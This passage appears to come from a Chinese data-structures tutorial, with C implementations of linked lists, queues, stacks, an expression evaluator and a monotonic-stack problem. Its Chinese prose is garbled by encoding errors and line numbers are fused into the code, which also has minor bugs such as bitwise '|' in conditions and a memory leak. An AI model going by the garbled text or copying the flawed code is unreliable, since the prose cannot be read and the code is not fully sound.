è€Œä¸å†æ˜¯ä¸€ä¸ªæŒ‡é’ˆ Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; n-&gt;prev = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;head.prev = NULL; // not necessarily l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// æ’å…¥è¾“å…¥èŠ‚ç‚¹int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; n-&gt;prev = prev; if (n-&gt;next) n-&gt;next-&gt;prev = n; l-&gt;len++; return 1;&#125;// æ’å…¥è¾“å…¥å€¼int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// åˆ é™¤int erase(List *l, int idx) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt;= l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; Node *tmp = prev-&gt;next; prev-&gt;next = tmp-&gt;next; if (tmp-&gt;next) tmp-&gt;next-&gt;prev = prev; freeNode(tmp); l-&gt;len--; return 1;&#125;int reverse(List *l) &#123; if (!l || l-&gt;len == 0) return 0; Node *p = l-&gt;head.next; Node *cur = NULL; l-&gt;head.next = NULL; l-&gt;len = 0; while (p) &#123; cur = p; p = p-&gt;next; insertNode(l, 0, cur); &#125; return 1;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *tmp = &amp;(l-&gt;head); int len = l-&gt;len; // printf(\"List+: [\"); // while (len--) &#123; // tmp = p; // printf(\"%d-&gt;\", p-&gt;val); // p = p-&gt;next; // &#125; // printf(\"NULL]\\n\"); // printf(\"List-: [\"); // len = l-&gt;len; // while (len--) &#123; // printf(\"%d-&gt;\", tmp-&gt;val); // tmp = tmp-&gt;prev; // &#125; // printf(\"HEAD]\\n\"); printf(\"List+: [\"); while (p) &#123; tmp = p; printf(\"%d-&gt;\", p-&gt;val); p = p-&gt;next; &#125; printf(\"NULL]\\n\"); printf(\"List-: [\"); while (tmp != &amp;(l-&gt;head)) &#123; printf(\"%d-&gt;\", tmp-&gt;val); tmp = tmp-&gt;prev; &#125; printf(\"HEAD]\\n\"); return;&#125;int main(int argc, char **argv) &#123; srand(time(NULL)); int cnt = 20; List *l = initList(); while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 5; int idx = rand() % (l-&gt;len + 3) - 1; switch (opt) &#123; case 0: case 1: case 2: printf(\"insert %d at %d, res = %s\\n\", val, idx, insertValue(l, idx, val) ? \"SUCCESS\" : \"FAILED\"); break; case 3: printf(\"erease at %d, res = %s\\n\", idx, erase(l, idx) ? \"SUCCESS\" : \"FAILED\"); break; case 4: printf(\"reverse, res = %s\\n\", reverse(l) ? \"SUCCESS\" : \"FAILED\"); break; &#125; showList(l); printf(\"\\n\"); &#125; return 0;&#125; ç»ƒä¹  LeetCode å‰‘æŒ‡offerï¼š 24 35 18 06 25 22 36 52 é¡ºåºè¡¨å¾ªç¯å·¦ç§» 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ERROR 0#define OK 1typedef struct Vector &#123; int size, len; int *data;&#125; Vec;void initVec(Vec *v, int size) &#123; if (!v) return; v-&gt;size = size; v-&gt;len = 0; v-&gt;data = (int *)malloc(sizeof(int) * size); return;&#125;int expand(Vec *v) &#123; int asize = v-&gt;size; int *tmp = NULL; while (asize) &#123; tmp = (int *)realloc(v-&gt;data, sizeof(int) * (asize + v-&gt;size)); if (tmp) break; asize &gt;&gt;= 2; &#125; if (tmp == NULL) return ERROR; v-&gt;data = tmp; v-&gt;size += asize; return OK;&#125;int insert(Vec *v, int idx, int val) &#123; if (!v) return ERROR; if (idx &lt; 0 | idx &gt; v-&gt;len) return ERROR; if (v-&gt;size == v-&gt;len) if (!expand(v)) return ERROR; memcpy(v-&gt;data + idx + 1, v-&gt;data + idx, sizeof(int) * (v-&gt;len - idx)); v-&gt;data[idx] = val; v-&gt;len++; return OK;&#125;void freeVec(Vec *v) &#123; if (!v) return; free(v-&gt;data); free(v);&#125;// moveint moveBlock(Vec *v, int num) &#123; if (!v) return ERROR; if (num &lt; 0 | num &gt; v-&gt;len) return ERROR; int *tmp = (int *)malloc(num * sizeof(int)); memcpy(tmp, v-&gt;data, sizeof(int) * num); memcpy(v-&gt;data, v-&gt;data + num, sizeof(int) * (v-&gt;len - num)); memcpy(v-&gt;data + (v-&gt;len - num), tmp, sizeof(int) * num); return OK;&#125;void printVec(Vec *v) &#123; if (!v) return; for (int i = 0; i &lt; v-&gt;len; i++) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d\", *(v-&gt;data + i)); &#125; return;&#125;int main() &#123; Vec *v = (Vec *)malloc(sizeof(Vec)); (void)initVec(v, 10); int n, k, val; scanf(\"%d%d\", &amp;n, &amp;k); for (int i=0; i&lt;n; i++) &#123; scanf(\"%d\", &amp;val); if (!insert(v, i, val)) return 3; &#125; if (!moveBlock(v, k)) return 4; (void)printVec(v); (void)freeVec(v); return 0;&#125; reverse chars 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next;&#125; Node;typedef struct List&#123; // Node *head; æ”¹ä¸º dummy node, è€Œä¸å†æ˜¯ä¸€ä¸ªæŒ‡é’ˆ Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; while (p) &#123; del_ = p; p = p-&gt;next; free(del_); &#125; free(l); return;&#125;// æ’å…¥è¾“å…¥èŠ‚ç‚¹int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; l-&gt;len++; return 1;&#125;// æ’å…¥è¾“å…¥å€¼int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// å®ç°reverseint reverse(List *l) &#123; if (!l) return 0; Node *cur = l-&gt;head.next; Node *tmp = NULL; l-&gt;head.next = NULL; l-&gt;len = 0; while (cur) &#123; tmp = cur; cur = cur-&gt;next; tmp-&gt;next = l-&gt;head.next; l-&gt;head.next = tmp; l-&gt;len++; &#125; return 1;&#125;int search(List *l, int idx) &#123; if (!l) return -1; if (idx &lt; 0 | idx &gt;= l-&gt;len) return -1; Node *prev = &amp;(l-&gt;head); while (idx--) prev = prev-&gt;next; return prev-&gt;next-&gt;val;&#125;void showList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; while (p) &#123; printf(\"%c\", p-&gt;val); p = p-&gt;next; (p != NULL) &amp;&amp; printf(\" \"); &#125; return;&#125;int main() &#123; int n; char c; scanf(\"%d\", &amp;n); List *l = initList(); getchar(); for (int i=0; i&lt;n * 2 - 1; i++) &#123; scanf(\"%c\", &amp;c); if (c &gt; 40) &#123; if (!insertValue(l, i / 2, c)) return 1; &#125; &#125; if (!reverse(l)) return 2; (void)showList(l); freeList(l); return 0;&#125; åŒå‘å¾ªç¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;typedef struct Node&#123; int val; struct Node *next; struct Node *prev;&#125; Node;typedef struct List&#123; // Node *head; æ”¹ä¸º dummy node, è€Œä¸å†æ˜¯ä¸€ä¸ªæŒ‡é’ˆ Node head; int len;&#125; List;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; n-&gt;prev = NULL; return n;&#125;void freeNode(Node *n) &#123; if (n) free(n); return;&#125;List *initList() &#123; List *l = (List *)malloc(sizeof(List)); l-&gt;head.next = NULL; l-&gt;head.prev = NULL; // not necessarily l-&gt;len = 0; return l;&#125;void freeList(List *l) &#123; if (!l) return; Node *p = l-&gt;head.next; Node *del_ = NULL; int len = l-&gt;len; while (len) &#123; // æ›´æ”¹ä¸ºæŒ‰é•¿åº¦free del_ = p; p = p-&gt;next; free(del_); len--; &#125; free(l); return;&#125;// æ’å…¥è¾“å…¥èŠ‚ç‚¹: æ›´æ”¹ä¸ºå¾ªç¯é“¾è¡¨int insertNode(List *l, int idx, Node *n) &#123; if (!l) return 0; if (idx &lt; 0 | idx &gt; l-&gt;len) return 0; if (l-&gt;len == 0) &#123; l-&gt;head.next = n; n-&gt;prev = n; n-&gt;next = n; l-&gt;len++; return 1; &#125; Node *prev = l-&gt;head.next; while (idx--) prev = prev-&gt;next; n-&gt;next = prev-&gt;next; prev-&gt;next = n; n-&gt;prev = prev; if (n-&gt;next) n-&gt;next-&gt;prev = n; if (n == l-&gt;head.next-&gt;next) &#123; l-&gt;head.next = n; &#125; l-&gt;len++; return 1;&#125;// æ’å…¥è¾“å…¥å€¼int insertValue(List *l, int idx, int val) &#123; Node *n = initNode(val); if (!insertNode(l, idx, n)) &#123; freeNode(n); return 0; &#125; return 1;&#125;// æ›´æ”¹ä¸ºå¾ªç¯é“¾è¡¨ ä» k ä½ç½®åå‘è¾“å‡ºvoid showList(List *l, int k) &#123; if (!l) return; Node *p = l-&gt;head.next; int c = l-&gt;len; while (p-&gt;val != k &amp;&amp; c) &#123; p = p-&gt;next; c--; &#125; if (c == 0 &amp;&amp; p-&gt;val != k) return; Node *tmp = p; int len = l-&gt;len; while (tmp != p-&gt;next) &#123; printf(\"%d \", tmp-&gt;val); tmp = tmp-&gt;prev; &#125; printf(\"%d\", p-&gt;next-&gt;val); return;&#125;int main(int argc, char **argv) &#123; int n, val; scanf(\"%d\", &amp;n); List *l = initList(); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); insertValue(l, i, val); &#125; int k; scanf(\"%d\", &amp;k); showList(l, k); freeList(l); return 0;&#125; é˜Ÿåˆ— é˜Ÿåˆ—æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨ï¼Œå°±æ˜¯ å…ˆè¿›å…ˆå‡º ï¼ŒFirst In First Out(FIFO)ã€‚ åˆ©ç”¨ä¸¤ä¸ªå˜é‡headå’Œtailç»´æŠ¤é˜Ÿåˆ—çš„è¿›å‡ºã€‚ ç®€å•å®ç° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Queue&#123; int *data; int head, tail, length;&#125;Queue;void init(Queue *q, int length) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length); q-&gt;head = 0; q-&gt;tail = -1; q-&gt;length = length;&#125;int push(Queue *q, int element) &#123; if (q-&gt;tail + 1 &gt;= q-&gt;length) return 0; q-&gt;data[++q-&gt;tail] = element; return 1; &#125;void output(Queue *q) &#123; for (int i = q-&gt;head; i &lt;= q-&gt;tail; ++i) &#123; (i != q-&gt;head) &amp;&amp; printf(\" \"); printf(\"%d\", q-&gt;data[i]); &#125;&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head++;&#125;int empty(Queue *q) &#123; return q-&gt;head &gt; q-&gt;tail;&#125;void clear(Queue *q) &#123; free(q-&gt;data); free(q);&#125;int main() &#123; Queue *queue = (Queue *)malloc(sizeof(Queue)); init(queue, 100); int n, val; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); if (!push(queue, val)) return 1; &#125; if (!empty(queue)) &#123; int k; scanf(\"%d\", &amp;k); while (k--) &#123; pop(queue); &#125; &#125; if (!empty(queue)) &#123; printf(\"%d\\n\", front(queue)); output(queue); &#125; else &#123; printf(\"0\"); &#125; clear(queue); return 0;&#125; å¾ªç¯é˜Ÿåˆ— åœ¨å¾ªç¯é˜Ÿåˆ—é‡Œï¼Œä¸èƒ½å•çº¯é€šè¿‡æ¯”è¾ƒ tail å’Œ head æ ‡è®°æ¥åˆ¤æ–­å¾ªç¯é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ï¼Œå¦åˆ™åœ¨åˆå§‹åŒ–çŠ¶æ€å°±ä¼šè¢«è®¤ä¸ºå¾ªç¯é˜Ÿåˆ—å·²æ»¡ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Queue &#123; int *data; int head, tail, length, count;&#125;Queue;void init(Queue *q, int length) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length); q-&gt;length = length; q-&gt;head = 0; q-&gt;tail = -1; q-&gt;count = 0;&#125;// æ‰©å®¹éœ€è¦è€ƒè™‘å¾ªç¯ç»“æ„int expand(Queue *q) &#123; if (!q) return ERROR; int expsize = q-&gt;length; int *tmp = NULL; while (expsize &gt; 0) &#123; // å› ä¸ºè¦é‡æ–°ç»„ç»‡æ•°æ®ï¼Œæ‰€ä»¥ä¸ç”¨reallocäº† tmp = (int *)malloc(sizeof(int) * (q-&gt;length + expsize)); if (tmp) break; expsize &gt;&gt;= 1; &#125; if (!tmp) return ERROR; // å¤åˆ¶åˆ°æ–°ç©ºé—´ä¸­ int i, j; int end = (q-&gt;tail + 1) % q-&gt;length; for (i = q-&gt;head, j = 0; i != end; i = (i + 1) % q-&gt;length, j++) &#123; tmp[j] = q-&gt;data[i]; &#125; free(q-&gt;data); q-&gt;data = tmp; q-&gt;length += expsize; q-&gt;head = 0; q-&gt;tail = j - 1; return OK;&#125;int push(Queue *q, int element) &#123; if (q-&gt;count &gt;= q-&gt;length) &#123; if (!expand(q)) return ERROR; &#125; q-&gt;tail = (q-&gt;tail + 1) % q-&gt;length; // ç¯ å–ä½™ q-&gt;data[q-&gt;tail] = element; q-&gt;count++; return OK;&#125;void output(Queue *q) &#123; int i = q-&gt;head; // ä» head åˆ° tail do &#123; printf(\"%d \", q-&gt;data[i]); i = (i + 1) % q-&gt;length; &#125; while(i != (q-&gt;tail + 1) % q-&gt;length); printf(\"\\n\");&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head = (q-&gt;head + 1) % q-&gt;length; // ç¯ å–ä½™ q-&gt;count--;&#125;int empty(Queue *q) &#123; return q-&gt;count == 0;&#125;void clear(Queue *q) &#123; free(q-&gt;data); free(q);&#125;int main() &#123; Queue *q = (Queue *)malloc(sizeof(Queue)); init(q, 100); for (int i = 1; i &lt;= 10; i++) &#123; push(q, i); &#125; output(q); if (!empty(q)) &#123; printf(\"%d\\n\", front(q)); pop(q); &#125; output(q); clear(q); return 0;&#125; é“¾è¡¨å®ç°é˜Ÿåˆ— é“¾è¡¨ä½¿ç”¨äº†ä¸€ä¸ªdummy node. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;time.h&gt;#define ERROR 0;#define OK 1;typedef struct Node &#123; int val; struct Node *next;&#125; Node, *Node_p;// è®¾è®¡ä¸ºå¸¦æœ‰dummy headçš„é“¾è¡¨typedef struct Queue &#123; Node *head; Node *tail; int len;&#125; Queue, *Queue_p;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;Queue *initStack() &#123; Queue_p q = (Queue_p)malloc(sizeof(Queue)); q-&gt;head = initNode(-1); q-&gt;tail = NULL; q-&gt;len = 0; return q;&#125;int push(Queue_p q, int val) &#123; if (!q) return ERROR; Node_p node = initNode(val); // æœ‰tailå°±åœ¨tailä¹‹åå¢åŠ  if (q-&gt;tail) &#123; q-&gt;tail-&gt;next = node; q-&gt;tail = node; &#125; else &#123; node-&gt;next = q-&gt;head-&gt;next; q-&gt;head-&gt;next = node; q-&gt;tail = node; &#125; q-&gt;len++; return OK;&#125;void freeNode(Node_p n) &#123; if (n) free(n);&#125;int pop(Queue_p q) &#123; if (!q || !q-&gt;head || !q-&gt;head-&gt;next) return ERROR; Node_p tmp = q-&gt;head-&gt;next; q-&gt;head-&gt;next = q-&gt;head-&gt;next-&gt;next; freeNode(tmp); // æœ€åä¸€ä¸ªèŠ‚ç‚¹è¢«å¼¹å‡º if (q-&gt;head-&gt;next == NULL) q-&gt;tail = NULL; q-&gt;len--; return OK;&#125;int top(Queue_p q) &#123; if (!q || !q-&gt;head || !q-&gt;head-&gt;next) return ERROR; return q-&gt;head-&gt;next-&gt;val;&#125;int empty(Queue_p q) &#123; return (!q || !q-&gt;head || !q-&gt;head-&gt;next);&#125;void freeStack(Queue_p q) &#123; if (!q || !q-&gt;head) return; Node *p = q-&gt;head, *tmp; while (p) &#123; tmp = p; p = p-&gt;next; freeNode(tmp); &#125; free(q);&#125;void showStack(Queue_p q) &#123; if (!q || !q-&gt;head) return; Node_p p = q-&gt;head-&gt;next; while (p) &#123; (p != q-&gt;head-&gt;next) &amp;&amp; printf(\" \"); printf(\"%d\", p-&gt;val); p = p-&gt;next; &#125; printf(\"\\n\");&#125;int main() &#123; srand(time(NULL)); Queue_p q = initStack(); int cnt = 20; while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 4; switch (opt) &#123; case 0: case 1: case 2: printf(\"push %d, %s\\n\", val, push(q, val) ? \"SUC\": \"ERROR\"); showStack(q); break; case 3: empty(q) ? printf(\"Nothing to pop.\\n\") : printf(\"Pop.\\n\"); pop(q); showStack(q); break; &#125; &#125; printf(\"\\nFinal: \\n\"); showStack(q); return 0;&#125; æ ˆ æ ˆæœ‰ä¸€ä¸ªé‡è¦çš„æ€§è´¨ï¼Œå°±æ˜¯ å…ˆè¿›åå‡º ï¼ŒFirst In Last Out(FILO)ã€‚ä¾‹å¦‚ï¼Œæµè§ˆå™¨é¡µé¢çš„å¤šæ¬¡è·³è½¬å’Œå¤šæ¬¡è¿”ä¼šåŠŸèƒ½ï¼Œå°±æ˜¯æ ˆçš„åº”ç”¨ã€‚ åˆ©ç”¨ä¸€ä¸ªå˜é‡ç»´æŠ¤æ ˆé¡¶ä½ç½®ã€‚ æ ˆï¼Œé€šè¿‡å®ç°ä¸€ä¸ªè¡¨è¾¾å¼è§£æé—®é¢˜ï¼Œè¿›è¡Œå®ç°ã€‚ ç”¨æ ˆå®ç°è¡¨è¾¾å¼æ±‚å€¼çš„ç®—æ³•æµç¨‹å¦‚ä¸‹ï¼š ä½¿ç”¨ä¸¤ä¸ªæ ˆåˆ†åˆ«å­˜å‚¨æ•°å€¼å’Œè¿ç®—ç¬¦ã€‚ è¯»å–è¡¨è¾¾å¼å­—ç¬¦ï¼Œæ•°å€¼å­˜å…¥æ•°å€¼æ ˆï¼Œè¿ç®—ç¬¦å’Œæ ˆé¡¶è¿ç®—ç¬¦æ¯”è¾ƒä¼˜å…ˆçº§ã€‚ é€šè¿‡è¿ç®—ç¬¦ä¼˜å…ˆçº§ä¸åŒé€‰æ‹©å°†å®ƒå‹å…¥æ ˆæˆ–å–å‡ºæ•°å€¼æ ˆä¸­ä¸¤ä¸ªå…ƒç´ è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—ç»“æœå…¥æ ˆã€‚ è¿”å›æ­¥éª¤ 2ï¼Œç›´è‡³è¡¨è¾¾å¼å…¨éƒ¨è¯»å®Œã€‚ å¼¹å‡ºä¸€ä¸ªè¿ç®—ç¬¦å’Œä¸¤ä¸ªæ•°å€¼è¿›è¡Œè¿ç®—ï¼Œè®¡ç®—ç»“æœå­˜å‚¨æ•°å€¼æ ˆã€‚ å½“è¿ç®—ç¬¦æ ˆä¸ä¸ºç©ºæ—¶ï¼Œè¿”å›æ­¥éª¤ 5ï¼Œå¦åˆ™æ•°å€¼æ ˆä¸­å‰©ä½™çš„æœ€åä¸€ä¸ªå…ƒç´ å°±æ˜¯è¡¨è¾¾å¼æ±‚å€¼ç»“æœã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#define ERROR 0#define OK 1typedef struct Stack &#123; int *elements; int max_size, top_index;&#125; Stack;void init(Stack *s, int length) &#123; s-&gt;elements = (int *)malloc(sizeof(int) * length); s-&gt;max_size = length; s-&gt;top_index = -1;&#125;int expand(Stack *s) &#123; if (!s) return ERROR; int expsize = s-&gt;max_size; int *tmp; while (expsize &gt; 0) &#123; tmp = (int *)realloc(s-&gt;elements, sizeof(int) * (s-&gt;max_size + expsize)); if (tmp) break; expsize &gt;&gt;= 1; &#125; if (!tmp) return ERROR; s-&gt;elements = tmp; s-&gt;max_size += expsize; return OK;&#125;int push(Stack *s, int element) &#123; if (s-&gt;top_index &gt;= s-&gt;max_size - 1) &#123; if (!expand(s)) return ERROR; &#125; s-&gt;top_index++; s-&gt;elements[s-&gt;top_index] = element; return OK;&#125;int pop(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return ERROR; &#125; s-&gt;top_index--; return OK;&#125;int top(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index];&#125;int empty(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;// ä¼˜å…ˆçº§åˆ¤æ–­int precede(char a, char b) &#123; if ((a == '*'||a=='/') &amp;&amp; (b == '+'||b == '-')) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;// è®¡ç®— a theta bint operate(char theta, int a, int b) &#123; if (theta == '+') &#123; return a + b; &#125; else if (theta == '*')&#123; return a * b; &#125; else if (theta == '-')&#123; return a - b; &#125; else if (theta == '/')&#123; return a / b; &#125;&#125;// è®¡ç®—è¡¨è¾¾å¼void calc(Stack *numbers, Stack *operators) &#123; int a = top(numbers); pop(numbers); int b = top(numbers); pop(numbers); push(numbers, operate(top(operators), b, a)); pop(operators);&#125;void clear(Stack *s) &#123; free(s-&gt;elements); free(s);&#125;int main() &#123; int n; scanf(\"%d\", &amp;n); Stack *numbers = (Stack *)malloc(sizeof(Stack)); init(numbers, n); Stack *operators = (Stack *)malloc(sizeof(Stack)); init(operators, n); char *buffer = (char *)malloc(sizeof(char) * (n + 1)); scanf(\"%s\", buffer); int i = 0; while (i &lt; n) &#123; if (isdigit(buffer[i])) &#123; push(numbers, buffer[i] - '0'); i++; &#125; else &#123; if (empty(operators) || precede(buffer[i], top(operators))) &#123; push(operators, buffer[i]); i++; &#125; else &#123; calc(numbers, operators); &#125; &#125; &#125; while (!empty(operators)) &#123; calc(numbers, operators); &#125; printf(\"%d\\n\", top(numbers)); clear(numbers); clear(operators); free(buffer); return 0;&#125; å•è°ƒæ ˆ åœ°ä¸Šä»å·¦åˆ°å³ç«–ç«‹ç€ n å—æœ¨æ¿ï¼Œä» 1 åˆ° n ä¾æ¬¡ç¼–å·ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æˆ‘ä»¬çŸ¥é“æ¯å—æœ¨æ¿çš„é«˜åº¦ï¼Œåœ¨ç¬¬ n å—æœ¨æ¿å³ä¾§ç«–ç«‹ç€ä¸€å—é«˜åº¦æ— é™å¤§çš„æœ¨æ¿ï¼Œç°å¯¹æ¯å—æœ¨æ¿ä¾æ¬¡åšå¦‚ä¸‹çš„æ“ä½œï¼šå¯¹äºç¬¬ i å—æœ¨æ¿ï¼Œæˆ‘ä»¬ä»å…¶å³ä¾§å¼€å§‹å€’æ°´ï¼Œç›´åˆ°æ°´çš„é«˜åº¦ç­‰äºç¬¬ i å—æœ¨æ¿çš„é«˜åº¦ï¼Œå€’å…¥çš„æ°´ä¼šæ·¹æ²¡ \\(a_i\\) å—æœ¨æ¿ï¼ˆå¦‚æœæœ¨æ¿å·¦å³ä¸¤ä¾§æ°´çš„é«˜åº¦å¤§äºç­‰äºæœ¨æ¿é«˜åº¦å³è§†ä¸ºæœ¨æ¿è¢«æ·¹æ²¡ï¼‰ã€‚æ±‚ n æ¬¡æ“ä½œåï¼Œæ‰€æœ‰ \\(a_i\\) çš„å’Œæ˜¯å¤šå°‘ã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨ç¬¬ 4 å—æœ¨æ¿å³ä¾§å€’æ°´ï¼Œå¯ä»¥æ·¹æ²¡ç¬¬ 5 å—å’Œç¬¬ 6 å—ä¸€å…± 2 å—æœ¨æ¿ï¼Œ\\(a_4\\) = 2ã€‚ å»ºç«‹ä¸€ä¸ªä»æ ˆé¡¶åˆ°æ ˆåº•é€’å¢çš„å•è°ƒæ ˆã€‚å‡è®¾æœ¨æ¿pæ˜¯æ ˆé¡¶å…ƒç´ ï¼Œæœ¨æ¿qæ˜¯å½“å‰å¾…å…¥æ ˆå…ƒç´ ã€‚ å°†q push åˆ°æ ˆçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ ˆé¡¶å…ƒç´ på‡ºæ ˆåˆ™è¡¨æ˜æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ¨æ¿på³ä¾§ç¬¬ä¸€å—æ¯”å®ƒé«˜çš„æœ¨æ¿qã€‚ ç„¶ååªéœ€è¦è®°å½•qä¸pä¹‹é—´çš„æœ¨æ¿æ•°ï¼Œæ±‚å’Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct Node &#123; int id, height;&#125; Node;typedef struct Stack &#123; Node *elements; int max_size, top_index;&#125; Stack;void init(Stack *s, int length) &#123; s-&gt;elements = (Node *)malloc(sizeof(Node) * length); s-&gt;max_size = length; s-&gt;top_index = -1;&#125;int push(Stack *s, Node element) &#123; if (s-&gt;top_index &gt;= s-&gt;max_size - 1) &#123; return ERROR; &#125; s-&gt;top_index++; s-&gt;elements[s-&gt;top_index] = element; return OK;&#125;int pop(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return ERROR; &#125; s-&gt;top_index--; return OK;&#125;Node top(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index];&#125;int empty(Stack *s) &#123; if (s-&gt;top_index &lt; 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;void clear(Stack *s) &#123; free(s-&gt;elements); free(s);&#125;int main() &#123; int n, ans = 0; scanf(\"%d\", &amp;n); Stack *stack = (Stack *)malloc(sizeof(Stack)); init(stack, n); Node temp; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;temp.height); temp.id = i; while (!empty(stack) &amp;&amp; top(stack).height &lt;= temp.height) &#123; ans = ans + i - top(stack).id - 1; pop(stack); &#125; push(stack, temp); &#125; while (!empty(stack)) &#123; ans = ans + n + 1 - top(stack).id - 1; pop(stack); &#125; printf(\"%d\\n\", ans); clear(stack); return 0;&#125; é“¾è¡¨å®ç°æ ˆ ä½¿ç”¨ä¸€ä¸ªå¸¦æœ‰dummy nodeçš„é“¾è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;time.h&gt;#define ERROR 0;#define OK 1;typedef struct Node &#123; int val; struct Node *next;&#125; Node, *Node_p;// è®¾è®¡ä¸ºå¸¦æœ‰dummy headçš„é“¾è¡¨typedef struct Stack &#123; Node *head; int len;&#125; Stack, *Stack_p;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;next = NULL; return n;&#125;Stack *initStack() &#123; Stack_p s = (Stack_p)malloc(sizeof(Stack)); s-&gt;head = initNode(-1); s-&gt;len = 0; return s;&#125;int push(Stack_p s, int val) &#123; if (!s) return ERROR; Node_p node = initNode(val); node-&gt;next = s-&gt;head-&gt;next; s-&gt;head-&gt;next = node; s-&gt;len++; return OK;&#125;void freeNode(Node_p n) &#123; if (n) free(n);&#125;int pop(Stack_p s) &#123; if (!s || !s-&gt;head || 